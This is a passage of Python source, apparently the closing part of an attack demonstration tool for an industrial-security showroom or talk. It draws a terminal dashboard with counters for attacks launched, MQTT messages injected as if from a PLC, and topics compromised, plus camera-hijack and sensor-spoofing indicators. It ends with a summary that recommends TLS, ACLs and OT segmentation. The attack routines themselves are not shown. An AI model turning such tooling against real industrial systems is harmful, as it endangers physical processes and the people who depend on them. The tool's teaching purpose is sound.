                cam_state = f"{C.ORANGE}hijack{C.RESET}"
        else:
            cam_state = f"{C.GREEN}live{C.RESET}"
        spoof_state = (f"{C.YELLOW}spoof{C.RESET}" if self.fake_sensor_running
                       else f"{C.GREEN}ok{C.RESET}")
        persistent_indicators = ""
        for lbl in self._active_injections():
            persistent_indicators += (f" {C.MUTE}│{C.RESET}  "
                                      f"{C.ORANGE}{lbl.upper()}{C.RESET}")

        elapsed = int(time.time() - self.session_start)
        mm, ss = divmod(elapsed, 60)
        session_timer = f"{mm:02d}:{ss:02d}"

        rule("═", C.MUTE)
        left = (f"  {C.DIM_FG}mqtt{C.RESET}  "
                f"{C.BLUE}{BROKER}:{PORT}{C.RESET}  "
                f"{C.MUTE}│{C.RESET}  "
                f"{C.DIM_FG}opcua{C.RESET} "
                f"{C.BLUE_D}{ENDPOINT}{C.RESET}")
        right = (f"{C.DIM_FG}cam{C.RESET} {cam_state}  "
                 f"{C.MUTE}│{C.RESET}  "
                 f"{C.DIM_FG}sensor{C.RESET} {spoof_state}  "
                 f"{C.MUTE}│{C.RESET}  "
                 f"{C.DIM_FG}{clock()}{C.RESET}  ")

        w = min(term_width(), 76)
        pad = max(w - visible_len(left) - visible_len(right), 2)
        print(left + " " * pad + right)

        metric_left = (f"  {C.DIM_FG}attacks{C.RESET} "
                       f"{C.ORANGE}{C.BOLD}{self.attacks_launched:>3}{C.RESET}  "
                       f"{C.MUTE}│{C.RESET}  "
                       f"{C.DIM_FG}msgs published{C.RESET} "
                       f"{C.BLUE_L}{self.msgs_published:>4}{C.RESET}  "
                       f"{C.MUTE}│{C.RESET}  "
                       f"{C.DIM_FG}topics owned{C.RESET} "
                       f"{C.BLUE_L}{len(self.topics_compromised):>2}{C.RESET}")
        metric_right = (f"{C.DIM_FG}elapsed{C.RESET} "
                        f"{C.BLUE}{session_timer}{C.RESET}{persistent_indicators}  ")
        pad2 = max(w - visible_len(metric_left) - visible_len(metric_right), 2)
        print(metric_left + " " * pad2 + metric_right)

        attacks_only = [x for x in self.timeline if x[3]]
        if attacks_only:
            recent = attacks_only[-4:]
            chips = []
            for t_rel, key, label, _ in recent:
                mm_t, ss_t = divmod(t_rel, 60)
                chips.append(f"{C.MUTE}[{mm_t:02d}:{ss_t:02d}]{C.RESET} "
                             f"{C.ORANGE}{key}{C.RESET}")
            timeline_line = f"  {C.DIM_FG}recent:{C.RESET} " + f" {C.MUTE}→{C.RESET} ".join(chips)
            print(timeline_line)

        rule("═", C.MUTE)

        key_color_by_section = {
            "MQTT · L1": C.DIM_FG,
            "MQTT · L3": C.YELLOW,
            "MQTT · L4": C.YELLOW,
            "MQTT · L5": C.ORANGE,
            "MQTT · L6": C.RED,
            "OPC-UA":    C.RED_B,
            "CONTROL":   C.BLUE,
        }
        current_section = None

        for item in actions:
            if len(item) == 2:
                name, subtitle = item
                current_section = name
                print(f"\n  {C.BLUE}{C.BOLD}{name}{C.RESET}  "
                      f"{C.DIM_FG}· {subtitle}{C.RESET}")
                print(f"  {C.MUTE}{'·' * 46}{C.RESET}")
            else:
                key, desc, _ = item
                if key == "q":
                    key_col = C.RED
                else:
                    key_col = key_color_by_section.get(current_section, C.BLUE)
                print(f"  {C.MUTE}[{C.RESET}{key_col}{key:>1}{C.MUTE}]{C.RESET}  "
                      f"{C.FG}{desc}{C.RESET}")

    def _shutdown(self):
        self.stop_all_background()
        self._print_summary()
        self.client.loop_stop()
        self.client.disconnect()

    def _print_summary(self):
        elapsed = int(time.time() - self.session_start)
        mm, ss = divmod(elapsed, 60)

        print()
        rule("═", C.RED_B)
        print(f"  {C.RED_B}SESSION SUMMARY{C.RESET}  "
              f"{C.DIM_FG}· offensive engagement complete{C.RESET}")
        rule("═", C.RED_B)
        print()

        stats = [
            ("attacks launched",   f"{self.attacks_launched:>3}",
             "comandos ofensivos ejecutados"),
            ("messages published", f"{self.msgs_published:>3}",
             "mensajes MQTT inyectados al bus industrial"),
            ("topics compromised", f"{len(self.topics_compromised):>3}",
             "distintos topics donde publicamos como si fuéramos el PLC"),
            ("session duration",   f"{mm:02d}:{ss:02d}",
             "tiempo desde la conexión al broker"),
        ]
        for label, value, subtitle in stats:
            print(f"  {C.ORANGE}{C.BOLD}{value:>6}{C.RESET}  "
                  f"{C.FG}{label:<20}{C.RESET}  "
                  f"{C.DIM_FG}{subtitle}{C.RESET}")

        if self.topics_compromised:
            print()
            print(f"  {C.DIM_FG}topics owned during this session:{C.RESET}")
            sorted_topics = sorted(self.topics_compromised)
            mid = (len(sorted_topics) + 1) // 2
            left_col = sorted_topics[:mid]
            right_col = sorted_topics[mid:]
            for i in range(mid):
                l = left_col[i]
                r = right_col[i] if i < len(right_col) else ""
                print(f"    {C.BLUE_L}▸{C.RESET} {C.DIM_FG}{l:<32}{C.RESET}"
                      f"  {C.BLUE_L}{'▸' if r else ' '}{C.RESET} {C.DIM_FG}{r}{C.RESET}")

        if self.timeline:
            print()
            print(f"  {C.DIM_FG}attack timeline:{C.RESET}")
            for t_rel, key, label, is_attack in self.timeline[-10:]:
                mm_t, ss_t = divmod(t_rel, 60)
                marker = (f"{C.ORANGE}▸{C.RESET}" if is_attack
                          else f"{C.MUTE}·{C.RESET}")
                key_col = C.ORANGE if is_attack else C.MUTE
                print(f"    {marker} "
                      f"{C.DIM_FG}{mm_t:02d}:{ss_t:02d}{C.RESET}  "
                      f"{key_col}[{key}]{C.RESET}  "
                      f"{C.DIM_FG}{label}{C.RESET}")

        print()
        if self.attacks_launched > 0:
            n = self.attacks_launched
            attack_word = "ataque" if n == 1 else "ataques"
            det_word = "el" if n == 1 else "los"
            rule("─", C.MUTE)
            print(f"  {C.FG}{C.BOLD}takeaway:{C.RESET} "
                  f"{C.DIM_FG}ningún mecanismo de control — ni autenticación, ni"
                  f"{C.RESET}")
            print(f"  {C.DIM_FG}TLS, ni validación de origen — detuvo ninguno de"
                  f" {det_word} {n} {attack_word}.{C.RESET}")
            print(f"  {C.DIM_FG}Mitigaciones en el deck: TLS + ACLs + segmentación OT.{C.RESET}")
            rule("─", C.MUTE)

        print(f"\n  {C.GREEN}▸{C.RESET} disconnected cleanly")
        print(f"  {C.DIM_FG}bye.{C.RESET}\n")


# ════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    try:
        ShowroomDemo().menu()
    except KeyboardInterrupt:
        print(f"\n\n  {C.BLUE}↳{C.RESET} interrupted\n")
    except ConnectionRefusedError:
        print(f"\n  {C.RED}✗{C.RESET} connection refused at "
              f"{C.BLUE}{BROKER}:{PORT}{C.RESET}")
        print(f"  {C.DIM_FG}check the broker is running, or set "
              f"BROKER=<ip> before running{C.RESET}\n")
        sys.exit(1)
